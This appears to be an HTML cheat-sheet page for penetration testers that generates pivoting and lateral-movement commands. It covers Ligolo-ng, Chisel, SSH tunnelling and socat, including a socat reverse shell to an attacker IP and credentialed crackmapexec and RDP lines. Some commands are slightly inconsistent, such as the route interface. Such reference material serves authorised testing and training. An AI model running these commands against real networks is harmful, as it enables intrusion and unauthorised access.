@@ -1,0 +1,1018 @@
+<!-- Save this as pivot.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PenHub - Port Forwarding & Pivoting</title>
+    <link href="https://fonts.cdnfonts.com/css/dubai" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --fg: #e0e0e0;
+            --accent: #b30000;
+            --accent-glow: #ff3333;
+            --panel: #111;
+            --border: #222;
+            --font: "Dubai", "Segoe UI", sans-serif;
+            --size: 1rem;
+            --blue: #1e90ff;
+            --red: #ff4444;
+            --green: #2a9d8f;
+            --yellow: #e9c46a;
+            --purple: #9d4edd;
+            --cyan: #4cc9f0;
+            --orange: #f8961e;
+        }
+        
+        * {
+            box-sizing: border-box;
+            font-family: var(--font);
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-size: var(--size);
+            line-height: 1.6;
+            overflow-x: hidden;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+        
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50px;
+            background: var(--panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 20px;
+            z-index: 10;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        nav a {
+            color: var(--fg);
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            font-size: 0.95rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        nav a:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-2px);
+        }
+        
+        nav a.active {
+            background: var(--accent);
+            color: white;
+            box-shadow: 0 0 12px rgba(255, 51, 51, 0.4);
+        }
+        
+.page {
+    display: none;
+    padding: 1px 25px 25px 25px;
+    min-height: 100vh;
+}
+        .page.active {
+            display: block;
+        }
+        
+aside {
+    width: 360px;
+    position: fixed;
+    top: 0px;  /* Changed to 50px */
+    left: 0;
+    bottom: 0;
+    background: var(--panel);
+    padding: 20px;
+    overflow-y: auto;
+    border-right: 1px solid var(--border);
+    scrollbar-width: thin;
+    scrollbar-color: var(--accent) var(--panel);
+}
+        
+        main {
+            margin-left: 380px;
+            padding: 20px;
+        }
+        
+        .page-title {
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--accent);
+            font-size: 2rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+        }
+        
+        .subtitle {
+            color: #aaa;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+        
+        .config-section {
+            background: #151515;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .config-section h3 {
+            color: var(--accent-glow);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #f0f0f0;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 10px;
+            background: #1a1a1a;
+            color: var(--fg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+        
+        .input-group input:focus, .input-group select:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(255, 51, 51, 0.2);
+        }
+        
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        
+        .checkbox-group input {
+            margin-right: 8px;
+            width: auto;
+        }
+        
+        .tool-card {
+            background: var(--panel);
+            border-radius: 8px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .tool-header {
+            background: #151515;
+            padding: 15px 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-header:hover {
+            background: #1a1a1a;
+        }
+        
+        .tool-header h2 {
+            color: var(--accent-glow);
+            margin: 0;
+            font-size: 1.3rem;
+        }
+        
+        .tool-header .toggle-icon {
+            color: var(--accent-glow);
+            font-size: 1.2rem;
+            transition: transform 0.3s ease;
+        }
+        
+        .tool-header.expanded .toggle-icon {
+            transform: rotate(180deg);
+        }
+        
+        .tool-body {
+            display: none;
+            padding: 20px;
+        }
+        
+        .tool-tags {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .tool-tag {
+            background: var(--accent);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        
+        .tool-tag.blue { background: var(--blue); }
+        .tool-tag.green { background: var(--green); color: #fff; }
+        .tool-tag.cyan { background: var(--cyan); }
+        .tool-tag.orange { background: var(--orange); }
+        
+        .command-block {
+            background: #000;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            position: relative;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .command-block pre {
+            margin: 0;
+            padding: 0;
+            background: none;
+            border: none;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        
+        .command-block .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .command-block .copy-btn:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+        
+        .command-desc {
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            padding-left: 10px;
+            border-left: 2px solid var(--blue);
+        }
+        
+        .flow-diagram {
+            background: #1a1a2a;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            border: 1px solid #444;
+        }
+        
+        .flow-step {
+            display: inline-block;
+            margin: 0 10px;
+            padding: 10px;
+            background: #252540;
+            border-radius: 4px;
+            min-width: 120px;
+        }
+        
+        .flow-arrow {
+            display: inline-block;
+            color: var(--accent);
+            font-size: 1.5rem;
+            vertical-align: middle;
+        }
+        
+        pre .attacker { color: var(--cyan); font-weight: 600; }
+        pre .attacker-port { color: var(--yellow); font-weight: 600; }
+        pre .target { color: var(--red); font-weight: 600; }
+        pre .target-port { color: var(--purple); font-weight: 600; }
+        pre .local-port { color: var(--blue); font-weight: 600; }
+        pre .interface { color: var(--cyan); font-weight: 600; }
+        pre .socks-port { color: var(--yellow); font-weight: 600; }
+        pre .file { color: var(--blue); font-weight: 600; }
+        pre .user { color: var(--purple); font-weight: 600; }
+        pre .password { color: var(--red); font-weight: 600; }
+        
+        .quick-guide {
+            background: linear-gradient(135deg, #1a1a2a 0%, #16213e 100%);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            border: 1px solid #444;
+        }
+        
+        .quick-guide h3 {
+            color: var(--blue);
+            margin-bottom: 15px;
+        }
+        
+        .guide-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .guide-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .guide-item h4 {
+            color: var(--cyan);
+            margin-bottom: 8px;
+            font-size: 1rem;
+        }
+        
+        .guide-item p {
+            color: #ccc;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .control-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .control-buttons button {
+            flex: 1;
+            padding: 12px;
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .control-buttons button:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+        
+        
+        /* New styles for Ligolo-ng guide */
+        .setup-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            background: #151515;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .setup-table th {
+            background: var(--accent);
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+        
+        .setup-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid #333;
+            font-size: 0.9rem;
+        }
+        
+        .setup-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .technique-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        
+        .technique-table th {
+            background: #252540;
+            color: var(--cyan);
+            padding: 10px;
+            text-align: left;
+            font-size: 0.9rem;
+            border: 1px solid #444;
+        }
+        
+        .technique-table td {
+            padding: 10px;
+            border: 1px solid #444;
+            font-size: 0.9rem;
+            background: #1a1a2a;
+        }
+        
+        .info-box {
+            background: #1a2a2a;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            border-left: 4px solid var(--green);
+        }
+        
+        .info-box h4 {
+            color: var(--green);
+            margin-bottom: 10px;
+        }
+        
+        .warning-box {
+            background: #2a1a1a;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            border-left: 4px solid var(--red);
+        }
+        
+        .warning-box h4 {
+            color: var(--red);
+            margin-bottom: 10px;
+        }
+        
+        @media (max-width: 900px) {
+            aside {
+                position: relative;
+                width: 100%;
+                border-right: 0;
+                top: 0;
+            }
+            
+            main {
+                margin-left: 0;
+            }
+            
+            .grid-2 {
+                grid-template-columns: 1fr;
+            }
+            
+            .setup-table, .technique-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PORT FORWARDING & PIVOTING PAGE -->
+    <div id="pivot" class="page active">
+        <aside>
+            <h1 class="page-title">Pivoting Toolkit</h1>
+            <p class="subtitle">Access internal networks through compromised hosts</p>
+            
+            <div class="config-section">
+                <h3>Target Configuration</h3>
+                <div class="input-group">
+                    <label>Target IP (Internal)</label>
+                    <input id="target-ip" placeholder="192.168.1.100" value="192.168.1.100">
+                </div>
+                <div class="input-group">
+                    <label>Target Port</label>
+                    <input id="target-port" placeholder="3389" value="3389">
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h3>Attacker Configuration</h3>
+                <div class="input-group">
+                    <label>Your IP (Kali)</label>
+                    <input id="attacker-ip" placeholder="10.10.14.5" value="10.10.14.5">
+                </div>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>Listener Port</label>
+                        <input id="attacker-port" placeholder="4444" value="4444">
+                    </div>
+                    <div class="input-group">
+                        <label>Local Port</label>
+                        <input id="local-port" placeholder="8888" value="8888">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h3>Pivot Settings</h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>SOCKS Port</label>
+                        <input id="socks-port" placeholder="1080" value="1080">
+                    </div>
+                    <div class="input-group">
+                        <label>Interface</label>
+                        <input id="interface-input" placeholder="tun0" value="tun0">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h3>Authentication</h3>
+                <div class="checkbox-group">
+                    <label><input type="checkbox" id="use-auth"> Enable Authentication</label>
+                </div>
+                <div id="auth-fields">
+                    <div class="input-group">
+                        <label>Username</label>
+                        <input id="username" placeholder="admin" value="admin">
+                    </div>
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input id="password" placeholder="password123" value="password123" type="password">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="control-buttons">
+                <button onclick="toggleAllTools()" class="secondary">Expand All</button>
+            </div>
+        </aside>
+
+        <main>
+           
+            <!-- Lateral Movement Flow -->
+            <div class="flow-diagram">
+                <h3>Lateral Movement Flow</h3>
+                <div style="margin: 20px 0;">
+                    <div class="flow-step">Initial Compromise</div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">Establish Pivot</div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">Internal Recon</div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">Move Laterally</div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">Privilege Escalation</div>
+                </div>
+                <p style="color: #aaa; margin-top: 10px; font-size: 0.9rem;">
+                    Use this flow to systematically move through the network after initial access
+                </p>
+            </div>
+
+            <!-- Tool Sections -->
+            <!-- Ligolo-ng -->
+            <div class="tool-card">
+                <div class="tool-header" onclick="toggleTool(this)">
+                    <h2>Ligolo-ng</h2>
+                    <span class="toggle-icon">▼</span>
+                </div>
+                <div class="tool-body">
+                    <div class="quick-guide">
+                        <h3>Initial Setup Guide</h3>
+                        <p>Ligolo-ng is a tunneling tool that uses reverse TCP/TLS connections and a TUN interface to pivot through compromised networks.</p>
+                        
+                        <table class="setup-table">
+                            <thead>
+                                <tr>
+                                    <th>Step</th>
+                                    <th>Task</th>
+                                    <th>Key Command / Note</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>1</td>
+                                    <td>Install on Attacker Machine (Kali)</td>
+                                    <td><code>sudo apt install ligolo-ng</code></td>
+                                </tr>
+                                <tr>
+                                    <td>2</td>
+                                    <td>Download Agent for Target OS</td>
+                                    <td>From <a href="https://github.com/nicocha30/ligolo-ng/releases" style="color: var(--cyan);">GitHub Releases</a></td>
+                                </tr>
+                                <tr>
+                                    <td>3</td>
+                                    <td>Create TUN Interface on Attacker</td>
+                                    <td><code>sudo ip tuntap add user $(whoami) mode tun ligolo</code></td>
+                                </tr>
+                                <tr>
+                                    <td>4</td>
+                                    <td>Start Proxy Server</td>
+                                    <td><code>ligolo-proxy -selfcert -laddr 0.0.0.0:443</code></td>
+                                </tr>
+                                <tr>
+                                    <td>5</td>
+                                    <td>Transfer & Execute Agent on Target</td>
+                                    <td><code>./agent -connect YOUR_IP:443 -ignore-cert</code></td>
+                                </tr>
+                                <tr>
+                                    <td>6</td>
+                                    <td>Add Internal Route & Start Tunnel</td>
+                                    <td><code>sudo ip route add INTERNAL_NET/24 dev ligolo</code> then <code>start</code></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># 1. Create and activate TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# 2. Verify interface status
+ip link show ligolo</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Create TUN interface and bring it up (required before starting proxy)</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># 3. Start proxy server (on Kali)
+./ligolo-proxy -selfcert -laddr 0.0.0.0:<span class="attacker-port">4444</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Start Ligolo proxy server on your machine with self-signed certificate</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># 4. Run agent on target
+./agent -connect <span class="attacker">10.10.14.5</span>:<span class="attacker-port">4444</span> -ignore-cert</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Upload and execute agent on compromised host</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># 5. Add route to internal network
+sudo ip route add <span class="target">192.168.1.0</span>/24 dev <span class="interface">tun0</span>
+
+# 6. Start tunnel (in ligolo-proxy interface)
+start</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Add route for internal network and start the tunnel</div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h4>TUN Interface Workaround</h4>
+                        <p>If the <b>interface doesn't appear in <code>ifconfig</code></b> after creation:</p>
+                        <ol><br>
+                            <p>1. Check if interface exists:      <b> <code>ip link show ligolo</code></b><p>
+                            <p>2. If state is DOWN, activate it:      <b> <code>sudo ip link set ligolo up</code></b><p>
+                            <p>3. Use <b><code>ip addr show ligolo</code> </b>instead of <code>ifconfig</code> (more reliable)<p>
+                            <p>4. The interface gets its IP when you run <code>start</code> in the proxy session<p>
+                        </ol>
+                    </div>
+                    
+                    <h3 style="color: var(--cyan); margin: 20px 0 10px 0;">Proxy Interface Commands</h3>
+                    <div class="command-block">
+                        <pre># In ligolo-proxy interface after agent connects
+session               # List active connections
+session 1             # Select session 1
+ifconfig              # Discover network interfaces on target
+listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:443
+help                  # Show all available commands</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Essential commands for managing pivots from the proxy interface</div>
+                    </div>
+                    
+                    <h3 style="color: var(--cyan); margin: 20px 0 10px 0;">Advanced Pivoting Techniques</h3>
+                    
+                    <table class="technique-table">
+                        <thead>
+                            <tr>
+                                <th>Technique</th>
+                                <th>Best For</th>
+                                <th>Core Concept</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Single Pivot with Routing</strong></td>
+                                <td>Accessing one internal subnet</td>
+                                <td>Route the new subnet through your single <code>ligolo</code> TUN interface</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Multi-Hop Sequential Pivot</strong></td>
+                                <td>Moving linearly through chained networks (A→B→C)</td>
+                                <td>Deploy a new agent on each pivot host, connecting back to your <strong>original proxy</strong></td>
+                            </tr>
+                            <tr>
+                                <td><strong>Multi-Subnet Concurrent Pivot</strong></td>
+                                <td>Accessing multiple separate subnets from a single pivot host</td>
+                                <td>Create multiple TUN interfaces (<code>ligolo2</code>, <code>ligolo3</code>) and listeners</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <div class="command-block">
+                        <pre># Multi-Subnet Concurrent Pivot Setup
+# 1. Create additional TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo2
+sudo ip link set ligolo2 up
+
+# 2. Add new listener on proxy
+listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:443
+
+# 3. Connect new agent to new listener
+./agent -connect <span class="attacker">10.10.14.5</span>:8443 -ignore-cert
+
+# 4. Select new session and start with different interface
+start --tun ligolo2
+
+# 5. Add route for new subnet
+sudo ip route add 172.16.1.0/24 dev ligolo2</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Access multiple separate subnets simultaneously from a single pivot host</div>
+                    </div>
+                    
+                    <div class="warning-box">
+                        <h4>Security Notes</h4>
+                        <ul>
+                            <li><code>-selfcert</code> and <code>-ignore-cert</code> flags are for lab environments only</li>
+                            <li>For real engagements, use Let's Encrypt (<code>-autocert</code>) or your own certificates (<code>-certfile</code>/<code>-keyfile</code>)</li>
+                            <li>Ligolo-ng uses TLS and can mimic normal traffic, making it relatively stealthy</li>
+                            <li>Defenders should monitor for anomalous outbound TLS connections and unexpected TUN interface creation</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h4>Post-Exploitation Usage</h4>
+                        <p>Once your tunnel is active and routes are added:</p>
+                        <ul>
+                            <li>Use tools like <code>nmap</code>, <code>crackmapexec</code>, or Impacket's <code>psexec.py</code> directly without <code>proxychains</code></li>
+                            <li>Standard workflow: transfer agent → connect to proxy → discover interfaces (<code>ifconfig</code>) → add routes → scan and exploit</li>
+                            <li>Ligolo-ng transforms a compromised host into a seamless network bridge</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chisel -->
+            <div class="tool-card">
+                <div class="tool-header" onclick="toggleTool(this)">
+                    <h2>Chisel</h2>
+                    <span class="toggle-icon">▼</span>
+                </div>
+                <div class="tool-body">
+                    <div class="command-block">
+                        <pre># Reverse tunnel (Target → You)
+# On Kali:
+chisel server -p <span class="attacker-port">4444</span> --reverse
+
+# On target:
+chisel client <span class="attacker">10.10.14.5</span>:<span class="attacker-port">4444</span> R:<span class="local-port">8888</span>:<span class="target">192.168.1.100</span>:<span class="target-port">3389</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Target connects to you, forwards internal service</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># SOCKS5 Proxy
+# On Kali:
+chisel server -p <span class="attacker-port">4444</span> --socks5
+
+# On target:
+chisel client <span class="attacker">10.10.14.5</span>:<span class="attacker-port">4444</span> <span class="socks-port">1080</span>:socks</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Create SOCKS proxy for full network access</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSH Tunneling -->
+            <div class="tool-card">
+                <div class="tool-header" onclick="toggleTool(this)">
+                    <h2>SSH Tunneling</h2>
+                    <span class="toggle-icon">▼</span>
+                </div>
+                <div class="tool-body">
+                    <div class="command-block">
+                        <pre># Local port forward (Access remote service locally)
+ssh -L <span class="local-port">8888</span>:<span class="target">192.168.1.100</span>:<span class="target-port">3389</span> <span class="user">admin</span>@<span class="attacker">10.10.14.5</span> -N -f</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Forward remote port to your local machine</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># Dynamic SOCKS proxy
+ssh -D <span class="socks-port">1080</span> <span class="user">admin</span>@<span class="attacker">10.10.14.5</span> -N -f</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Create SOCKS proxy through SSH connection</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># Use with proxychains
+proxychains nmap -sT -Pn <span class="target">192.168.1.0</span>/24
+proxychains evil-winrm -i <span class="target">192.168.1.100</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Route tools through the proxy</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Socat -->
+            <div class="tool-card">
+                <div class="tool-header" onclick="toggleTool(this)">
+                    <h2>Socat</h2>
+                    <span class="toggle-icon">▼</span>
+                </div>
+                <div class="tool-body">
+                    <div class="command-block">
+                        <pre># Simple port forward
+socat TCP-LISTEN:<span class="local-port">8888</span>,fork,reuseaddr TCP:<span class="target">192.168.1.100</span>:<span class="target-port">3389</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Forward connections from local port to target</div>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># Reverse shell relay
+# On attacker:
+socat TCP-LISTEN:<span class="attacker-port">4444</span>,reuseaddr,fork EXEC:/bin/bash
+
+# On target:
+socat TCP:<span class="attacker">10.10.14.5</span>:<span class="attacker-port">4444</span> EXEC:/bin/bash</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                        <div class="command-desc">Create reverse shell through pivot</div>
+                    </div>
+                </div>
+            </div>
+
+            
+            <!-- Common Internal Tools -->
+            <div class="tool-card">
+                <div class="tool-header" onclick="toggleTool(this)">
+                    <h2>Common Internal Tools</h2>
+                    <span class="toggle-icon">▼</span>
+                </div>
+                <div class="tool-body">
+                    <div class="command-block">
+                        <pre># Scan through proxy
+proxychains nmap -sT -Pn -p 22,80,443,3389,445 <span class="target">192.168.1.0</span>/24</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># SMB enumeration
+proxychains crackmapexec smb <span class="target">192.168.1.0</span>/24 -u <span class="user">administrator</span> -p <span class="password">Password123</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># RDP through pivot
+proxychains xfreerdp /v:<span class="target">192.168.1.100</span> /u:<span class="user">administrator</span> /p:<span class="password">Password123</span></pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                    
+                    <div class="command-block">
+                        <pre># Web app testing
+proxychains gobuster dir -u http://<span class="target">192.168.1.101</span> -w /usr/share/wordlists/dirb/common.txt</pre>
+                        <button class="copy-btn" onclick="copyCommand(this)">Copy</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // DOM Elements
+        const attackerIp = document.getElementById('attacker-ip');
+        const attackerPort = document.getElementById('attacker-port');
+        const targetIp = document.getElementById('target-ip');
+        const targetPort = document.getElementById('target-port');
+        const localPort = document.getElementById('local-port');
+        const socksPort = document.getElementById('socks-port');
+        const interfaceInput = document.getElementById('interface-input');
+        const useAuth = document.getElementById('use-auth');
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const authFields = document.getElementById('auth-fields');
+
+        // Toggle tool sections
+        function toggleTool(header) {
+            const body = header.parentElement.querySelector('.tool-body');
+            const isExpanded = body.style.display === 'block';
+            
+            body.style.display = isExpanded ? 'none' : 'block';
+            header.classList.toggle('expanded', !isExpanded);
+        }
+
+        // Toggle all tools
+        function toggleAllTools() {
+            const bodies = document.querySelectorAll('.tool-body');
+            const headers = document.querySelectorAll('.tool-header');
+            const allHidden = [...bodies].every(b => b.style.display === 'none');
+            
+            bodies.forEach(b => b.style.display = allHidden ? 'block' : 'none');
+            headers.forEach(h => h.classList.toggle('expanded', allHidden));
+            
+            const btn = document.querySelector('button[onclick="toggleAllTools()"]');
+            btn.textContent = allHidden ? 'Collapse All' : 'Expand All';
+        }
+
+        // Copy command to clipboard
+        function copyCommand(btn) {
+            const commandBlock = btn.parentElement;
+            const pre = commandBlock.querySelector('pre');
+            const text = pre.textContent;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = btn.textContent;
+                btn.textContent = 'Copied!';
+                btn.style.background = 'var(--green)';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = 'var(--accent)';
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+            });
+        }
+
+        // Update commands with current values
+        function updateCommands() {
+            // Update all pre elements with current values
+            document.querySelectorAll('pre').forEach(pre => {
+                let html = pre.innerHTML;
+                
+                // Replace placeholders with current values
+                html = html.replace(/<span class="attacker">.*?<\/span>/g, `<span class="attacker">${attackerIp.value}</span>`);
+                html = html.replace(/<span class="attacker-port">.*?<\/span>/g, `<span class="attacker-port">${attackerPort.value}</span>`);
+                html = html.replace(/<span class="target">.*?<\/span>/g, `<span class="target">${targetIp.value}</span>`);
+                html = html.replace(/<span class="target-port">.*?<\/span>/g, `<span class="target-port">${targetPort.value}</span>`);
+                html = html.replace(/<span class="local-port">.*?<\/span>/g, `<span class="local-port">${localPort.value}</span>`);
+                html = html.replace(/<span class="socks-port">.*?<\/span>/g, `<span class="socks-port">${socksPort.value}</span>`);
+                html = html.replace(/<span class="interface">.*?<\/span>/g, `<span class="interface">${interfaceInput.value}</span>`);
+                html = html.replace(/<span class="user">.*?<\/span>/g, `<span class="user">${username.value}</span>`);
+                html = html.replace(/<span class="password">.*?<\/span>/g, `<span class="password">${password.value}</span>`);
+                
+                pre.innerHTML = html;
+            });
+        }
+
+        // Toggle auth fields visibility
+        useAuth.addEventListener('change', function() {
+            authFields.style.display = this.checked ? 'block' : 'none';
+            updateCommands();
+        });
+
+        // Initialize auth fields - HIDDEN by default
+        authFields.style.display = 'none';
+        useAuth.checked = false;
+
+        // Add event listeners to all inputs for live updates
+        const allInputs = [
+            attackerIp, attackerPort, targetIp, targetPort, 
+            localPort, socksPort, interfaceInput, username, password
+        ];
+
+        allInputs.forEach(input => {
+            input.addEventListener('input', updateCommands);
+        });
+
+        // Initialize with live updates
+        updateCommands();
+
+        // All sections start collapsed (default CSS already hides .tool-body)
+    </script>
+</body>
+</html>
